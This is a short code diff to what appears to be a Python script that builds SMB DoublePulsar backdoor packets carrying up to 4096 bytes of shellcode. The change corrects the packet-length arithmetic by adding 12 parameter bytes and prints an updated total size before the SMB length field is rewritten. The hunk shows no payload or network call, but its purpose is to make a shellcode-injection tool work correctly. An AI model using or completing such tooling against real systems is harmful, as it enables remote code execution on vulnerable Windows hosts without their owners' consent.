@@ -251,8 +251,14 @@ if __name__ == "__main__":
         print("Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
         print("but the NetBIOS header will say 4174 because the 4 bytes in the NetBIOS header doesn't count")
 
-        merged_packet_len = trans2_packet_len + shellcode_payload_size - 4
-        print("Total size of SMB packet & shellcode:  %d" % merged_packet_len)
+        '''
+        merged packet len = trans2 packet len ( 70 & contains NetBIOS Header )
+                           + merged shellcode length size
+                           + parameter len ( 12 )
+                           - NetBIOS header (4 )
+        '''
+        merged_packet_len = trans2_packet_len + shellcode_payload_size + 12 - 4
+        print("UPDATED:  Total size of SMB packet & shellcode:  %d" % merged_packet_len)
 
         print("Updating SMB length value...")
         #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
